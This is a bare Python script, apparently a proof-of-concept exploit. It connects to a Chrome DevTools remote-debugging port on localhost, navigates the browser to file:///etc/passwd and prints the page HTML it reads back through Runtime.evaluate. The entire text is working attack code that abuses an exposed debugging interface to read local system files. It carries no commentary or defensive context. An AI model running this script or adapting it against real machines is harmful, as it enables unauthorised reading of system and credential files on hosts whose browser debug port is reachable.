from time import sleep
import requests
import websocket
import json

def page_navigate(ws, url):
    payload = {
        "id": 1,
        "method": "Page.navigate",
        "params": {
            "url": url
        }
    }
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())

def get_current_html(ws):
    payload = {
        "id": 2,
        "method": "Runtime.evaluate",
        "params": {
            "expression": "document.documentElement.outerHTML"
        }
    }
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())["result"]["result"]["value"]

targets = requests.get("http://localhost:34445/json").json()
websocket_url = targets[0]["webSocketDebuggerUrl"]

ws = websocket.create_connection(websocket_url)
sleep(1)
print(page_navigate(ws, "file:///etc/passwd"))
sleep(3)
print(get_current_html(ws))
